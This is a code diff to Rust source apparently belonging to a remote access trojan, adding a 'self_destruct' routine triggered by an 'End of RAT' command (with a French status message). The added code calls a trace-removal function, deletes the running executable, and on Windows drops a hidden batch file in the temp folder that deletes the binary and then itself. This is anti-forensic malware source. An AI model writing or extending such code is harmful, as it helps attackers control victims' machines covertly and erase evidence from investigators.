@@ -3,6 +3,9 @@ use std::env;
 use std::fs::{self, OpenOptions};
 use std::io::{self, BufRead, BufReader, Write};
 use std::path::{Path, PathBuf};
+use std::process;
+use std::thread;
+use std::time::Duration;
 
 #[cfg(target_os = "windows")]
 fn get_executable_path() -> PathBuf {
@@ -184,4 +187,42 @@ pub fn remove_all_traces() {
             let _ = fs::write(&profile_path, new_content);
         }
     }
+}
+
+pub fn self_destruct() {
+    remove_all_traces();
+    
+    if let Ok(exe_path) = std::env::current_exe() {
+        let _ = fs::remove_file(&exe_path);
+        
+        #[cfg(target_os = "windows")]
+        {
+            let batch_content = format!(
+                r#"
+@echo off
+timeout /t 3 /nobreak > nul
+del /f /q "{}"
+del /f /q "%~f0"
+"#,
+                exe_path.to_string_lossy()
+            );
+            
+            let batch_path = std::env::temp_dir().join("cleanup.bat");
+            if fs::write(&batch_path, batch_content).is_ok() {
+                std::process::Command::new("cmd.exe")
+                    .args(&["/C", "start", "/B", batch_path.to_str().unwrap()])
+                    .spawn()
+                    .ok();
+            }
+        }
+    }
+    
+    process::exit(0);
+}
+
+pub fn handle_end_of_rat() {
+    println!("[!] Commande End of RAT reçue. Autodestruction en cours...");
+    
+    thread::sleep(Duration::from_secs(1));
+        self_destruct();
 }
